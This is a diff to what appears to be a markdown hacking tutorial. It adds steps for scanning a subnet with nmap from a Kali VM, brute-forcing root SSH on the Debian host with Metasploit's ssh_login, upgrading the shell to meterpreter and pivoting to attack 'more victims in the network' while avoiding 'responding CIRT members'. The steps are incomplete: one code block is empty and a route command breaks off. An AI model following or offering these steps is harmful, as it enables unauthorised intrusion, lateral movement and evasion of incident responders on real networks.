@@ -103,9 +103,52 @@ root@kali: ping 10.81.0.1
 ```
 # Perform your first attack. "Nmap" a target from the perspective of your Kali Linux attacker VM.
 
-Remember with the routing rule we added before we should be able to only percieve a 255 host range on 10.81.24.0/24. To add more subnets we need to alter the netmask part of the routing table. However I do not want to expose the VM to more hosts, potentially a very thick range of potential attackers. 
+Remember with the routing rule we added before we should be able to only percieve a 255 host range on 10.81.24.0/24. To add more subnets we need to alter the netmask part of the routing table. However I do not want to expose the VM to more hosts, potentially a very thick range of potential attackers and responding CIRT members. 
 
 
 ```
-root@kali: 
+root@kali: nmap 10.81.24.0/24
+```
+
+# Alternatively  we can also compromise the physical HOST running Debian and use it, as a tool, or a proxy minion to do the scanning for us.
+
+We need to do this safely, use tsocks and proxychains to have the physical Debian host run as a proxy.
+
+```
+```
+
+# Or... you can use Metasploit module and infect the Debian host with it to allow port-forwarding modules to run through the HOST to continue attacking more victims in the network
+
+Start up Metasploit using the standard initialization and startup of the metasploit database
+```
+msfdb init
+msfdb start
+msfconsole
+```
+
+Then because we know we can network both the Debian HOST and the Kali Linux VM together with SSH.
+
+```
+use auxiliary/scanners/ssh/ssh_login
+set PASSWORD ********
+set USER root
+set RHOSTS 192.168.0.1
+run -j
+```
+
+Note the value for RHOSTS is 192.168.0.1
+
+WE are interacting with the Debian HOST through the perspective of the guest Kali Linux. So Kali Linux is unaware that the HOST Debian is indeed 10.81.24.X, it only perceives it as anything in its own assigned subnet.
+
+A shell is going to pop. Just a standard Command Shell (SSH). Go upgrade it to meterpreter.
+
+
+```
+sessions -u 1
+```
+
+Another shell will pop. A more featureful shell, you need to route this shell's session into the physical network (as of right now that shell only can perceive network 192.168.0.0/24, the subnet that was granted to it upon KVM's installation).
+
+```
+route add 
 ```
